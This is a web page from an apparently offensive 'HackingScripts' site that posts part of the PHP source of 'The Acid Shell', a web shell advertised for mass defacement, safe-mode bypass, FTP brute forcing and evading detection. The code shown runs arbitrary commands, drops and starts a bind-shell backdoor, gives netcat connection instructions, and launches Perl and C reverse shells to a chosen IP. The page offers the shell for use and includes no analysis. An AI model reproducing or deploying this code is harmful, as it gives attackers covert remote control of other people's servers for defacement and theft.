<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> The Acid Shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>The Acid Shell</h2>
<p class="meta">10 Feb 2014</p>

<p>The Acid Shell seems to simply make use of various other shells all put together.</p>

<p>It&#8217;s also private! private! private! &#8230;</p>

<h3>The Acid Shell Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
    <span class="cm">/*</span>
<span class="cm">    -------------------------------------------------------------------------------------------</span>
<span class="cm">    private! private! private! private! private! private! private! private! private! private!</span>
<span class="cm">    -------------------------------------------------------------------------------------------</span>
<span class="cm">                            [ THE ACID SHELL ] [~ VERSION V2 ~] [~#]</span>
<span class="cm">    -------------------------------------------------------------------------------------------</span>
<span class="cm">    [ Features ]</span>
<span class="cm">    - Mass Defacement Tool</span>
<span class="cm">    - Safe Mode Bypass</span>
<span class="cm">    - Open_Basedir Bypass</span>
<span class="cm">    - Fixed SQL managed</span>
<span class="cm">    - FTP Brute Force Tool</span>
<span class="cm">    - Fully Undetected</span>
<span class="cm">    -------------------------------------------------------------------------------------------</span>
<span class="cm">    -------------------------------------------------------------------------------------------</span>
<span class="cm">                            - Do no Leak - Do Not Sell - Do Not Distribute -</span>
<span class="cm">    -------------------------------------------------------------------------------------------</span>
<span class="cm">    private! private! private! private! private! private! private! private! private! private!</span>
<span class="cm">    -------------------------------------------------------------------------------------------</span>
<span class="cm">    */</span>
     
    <span class="c1">//w4ck1ng Shell</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;myshellexec&#39;</span><span class="p">))</span>
    <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s1">&#39;popen&#39;</span><span class="p">)){</span>
    <span class="k">function</span> <span class="nf">myshellexec</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$p</span><span class="o">=</span><span class="nb">popen</span><span class="p">(</span><span class="s2">&quot;(</span><span class="si">$command</span><span class="s2">)2&amp;gt;&amp;1&quot;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="mi">126</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$p</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$line</span><span class="o">=</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$p</span><span class="p">,</span><span class="mi">1000</span><span class="p">);</span>
    <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$line</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nb">pclose</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="k">function</span> <span class="nf">myshellexec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="k">global</span> <span class="nv">$disablefunc</span><span class="p">;</span>
     <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">))</span>
     <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$result</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$result</span><span class="p">);}</span>
      <span class="k">elseif</span> <span class="p">((</span><span class="nv">$result</span> <span class="o">=</span> <span class="sb">`$cmd`</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
      <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)))</span>
      <span class="p">{</span>
       <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
       <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">1024</span><span class="p">);}</span>
       <span class="nb">pclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
      <span class="p">}</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$sh_name</span> <span class="o">=</span> <span class="nx">sh_name</span><span class="p">();</span>
     
     
    <span class="nv">$curdir</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span>
    <span class="nv">$tmpdir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span>
    <span class="nv">$log_email</span> <span class="o">=</span> <span class="s2">&quot;email@email.com&quot;</span><span class="p">;</span>
    <span class="nv">$sess_cookie</span> <span class="o">=</span> <span class="s2">&quot;cookie1&quot;</span><span class="p">;</span>
    <span class="nv">$sort_default</span> <span class="o">=</span> <span class="s2">&quot;0a&quot;</span><span class="p">;</span>
    <span class="nv">$sort_save</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="nv">$usefsbuff</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="nv">$copy_unset</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
    <span class="nv">$surl_autofill_include</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="nv">$updatenow</span>   <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
    <span class="nv">$gzipencode</span>  <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="nv">$filestealth</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
    <span class="nv">$hexdump_lines</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="nv">$hexdump_rows</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span>
    <span class="nv">$millink</span> <span class="o">=</span> <span class="nx">milw0rm</span><span class="p">();</span>
    <span class="nv">$win</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">))</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span><span class="p">;</span>
    <span class="nv">$disablefunc</span> <span class="o">=</span> <span class="nx">getdisfunc</span><span class="p">();</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ERROR</span> <span class="o">|</span> <span class="k">E_PARSE</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;max_execution_time&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">#No Fx in SafeMode</span>
    <span class="o">@</span><span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="nb">define</span><span class="p">(</span><span class="s2">&quot;starttime&quot;</span><span class="p">,</span><span class="nx">getmicrotime</span><span class="p">());</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">);</span> <span class="p">}</span>
    <span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">);</span>
    <span class="o">@</span><span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;f&quot;</span><span class="p">];</span>
    <span class="o">@</span><span class="nb">extract</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;tpshcook&quot;</span><span class="p">]);</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$$k</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$$k</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
     
     
    <span class="k">if</span> <span class="p">(</span><span class="nv">$surl_autofill_include</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$include</span> <span class="o">=</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;QUERY_STRING&quot;</span><span class="p">))</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nv">$value</span> <span class="o">=</span> <span class="o">@</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;http://&quot;</span><span class="p">,</span><span class="s2">&quot;https://&quot;</span><span class="p">,</span><span class="s2">&quot;ssl://&quot;</span><span class="p">,</span><span class="s2">&quot;ftp://&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$needle</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="nv">$needle</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$includestr</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">#BC_</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;use&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;shbd&quot;</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="nv">$ip</span> <span class="o">=</span> <span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]);</span>
     <span class="nv">$por</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">];</span>
     <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
     <span class="nx">cfb</span><span class="p">(</span><span class="s2">&quot;shbd&quot;</span><span class="p">,</span><span class="nv">$backdoor</span><span class="p">);</span>
     <span class="nb">chmod</span><span class="p">(</span><span class="s1">&#39;shbd&#39;</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
     <span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">&quot;./shbd </span><span class="si">$por</span><span class="s2">&quot;</span><span class="p">;</span>
     <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$cmd</span><span class="s2"> &amp;gt; /dev/null &amp;&quot;</span><span class="p">);</span>
     <span class="nv">$scan</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;ps aux&quot;</span><span class="p">);</span>
     <span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;./shbd </span><span class="si">$por</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$scan</span><span class="p">)){</span> <span class="nv">$data</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;Process found running, backdoor setup successfully.&quot;</span><span class="p">);</span> <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;./shbd </span><span class="si">$por</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$scan</span><span class="p">)){</span> <span class="nv">$data</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;/br&amp;gt;Process not found running, backdoor not setup successfully.&quot;</span><span class="p">);</span> <span class="p">}</span>
     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;To connect, use netcat and give it the command &amp;lt;b&amp;gt;&#39;nc </span><span class="si">$ip</span><span class="s2"> </span><span class="si">$por</span><span class="s2">&#39;&amp;lt;/b&amp;gt;.</span><span class="si">$data</span><span class="s2">&quot;</span><span class="p">;</span>
     <span class="p">}</span><span class="k">else</span><span class="p">{</span>
     <span class="nx">cfb</span><span class="p">(</span><span class="s2">&quot;/tmp/shbd&quot;</span><span class="p">,</span><span class="nv">$backdoor</span><span class="p">);</span>
     <span class="nb">chmod</span><span class="p">(</span><span class="s1">&#39;/tmp/shbd&#39;</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
     <span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">&quot;./tmp/shbd </span><span class="si">$por</span><span class="s2">&quot;</span><span class="p">;</span>
     <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$cmd</span><span class="s2"> &amp;gt; /dev/null &amp;&quot;</span><span class="p">);</span>
     <span class="nv">$scan</span> <span class="o">=</span> <span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;ps aux&quot;</span><span class="p">);</span>
     <span class="k">if</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;./shbd </span><span class="si">$por</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$scan</span><span class="p">)){</span> <span class="nv">$data</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;Process found running, backdoor setup successfully.&quot;</span><span class="p">);</span> <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;./shbd </span><span class="si">$por</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$scan</span><span class="p">)){</span> <span class="nv">$data</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;/br&amp;gt;Process not found running, backdoor not setup successfully.&quot;</span><span class="p">);</span> <span class="p">}</span>
     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;To connect, use netcat and give it the command &amp;lt;b&amp;gt;&#39;nc </span><span class="si">$ip</span><span class="s2"> </span><span class="si">$por</span><span class="s2">&#39;&amp;lt;/b&amp;gt;.</span><span class="si">$data</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">}</span>
     
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;use&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;Perl&quot;</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
     <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;back&quot;</span><span class="p">,</span><span class="nv">$back_connect</span><span class="p">);</span>
     <span class="nv">$p2</span><span class="o">=</span><span class="nx">which</span><span class="p">(</span><span class="s2">&quot;perl&quot;</span><span class="p">);</span>
     <span class="nv">$blah</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="nv">$p2</span><span class="o">.</span><span class="s2">&quot; back &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span>
     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;Trying to connect to &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt; on port &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;.&quot;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;back&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;back&quot;</span><span class="p">);</span> <span class="p">}</span>
     <span class="p">}</span><span class="k">else</span><span class="p">{</span>
     <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/back&quot;</span><span class="p">,</span><span class="nv">$back_connect</span><span class="p">);</span>
     <span class="nv">$p2</span><span class="o">=</span><span class="nx">which</span><span class="p">(</span><span class="s2">&quot;perl&quot;</span><span class="p">);</span>
     <span class="nv">$blah</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="nv">$p2</span><span class="o">.</span><span class="s2">&quot; /tmp/back &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span>
     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;Trying to connect to &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt; on port &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;.&quot;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;/tmp/back&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/back&quot;</span><span class="p">);</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">}</span>
     
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;use&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;C&quot;</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
     <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;backc&quot;</span><span class="p">,</span><span class="nv">$back_connect_c</span><span class="p">);</span>
     <span class="nb">chmod</span><span class="p">(</span><span class="s1">&#39;backc&#39;</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
     <span class="c1">//$blah = ex(&quot;gcc back.c -o backc&quot;);</span>
     <span class="nv">$blah</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;./backc &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span>
     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;Trying to connect to &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt; on port &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;.&quot;</span><span class="p">;</span>
     <span class="c1">//if (file_exists(&quot;back.c&quot;)) { unlink(&quot;back.c&quot;); }</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;backc&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;backc&quot;</span><span class="p">);</span> <span class="p">}</span>
     <span class="p">}</span><span class="k">else</span><span class="p">{</span>
     <span class="nb">chmod</span><span class="p">(</span><span class="s1">&#39;/tmp/backc&#39;</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
     <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/backc&quot;</span><span class="p">,</span><span class="nv">$back_connect_c</span><span class="p">);</span>
     <span class="c1">//$blah = ex(&quot;gcc -o /tmp/backc /tmp/back.c&quot;);</span>
     <span class="nv">$blah</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;/tmp/backc &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span>
     <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;Trying to connect to &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt; on port &amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backconnectport&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;.&quot;</span><span class="p">;</span>
     <span class="c1">//if (file_exists(&quot;back.c&quot;)) { unlink(&quot;back.c&quot;); }</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;/tmp/backc&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/backc&quot;</span><span class="p">);</span> <span class="p">}</span> <span class="p">}</span>
    <span class="p">}</span>
     
